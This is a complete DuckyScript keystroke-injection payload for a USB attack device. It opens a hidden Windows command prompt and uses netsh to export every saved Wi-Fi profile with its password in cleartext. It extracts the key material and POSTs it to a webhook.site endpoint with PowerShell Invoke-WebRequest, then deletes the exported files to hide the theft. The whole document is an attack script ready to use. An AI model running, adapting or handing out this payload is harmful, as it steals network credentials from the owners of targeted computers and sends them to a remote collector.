REM HOW TO: You need to use webhook.site and paste the webhook in the "<webhook>" placeholder to work.
DELAY 100
GUI r
DELAY 100
STRING cmd -windowstyle hiden
ENTER
DELAY 1000
STRING cd %temp%
ENTER
DELAY 100
STRING netsh wlan export profile key=clear
ENTER
DELAY 100
STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
ENTER
DELAY 100
STRING powershell Invoke-WebRequest -Uri https://webhook.site/c660e578-ebd9-4eb3-84a0-d8ad462bcf60 -Method POST -InFile Wi-Fi-PASS
ENTER
DELAY 100
STRING del Wi-Fi* /s /f /q
ENTER
DELAY 100
STRING exit
ENTER
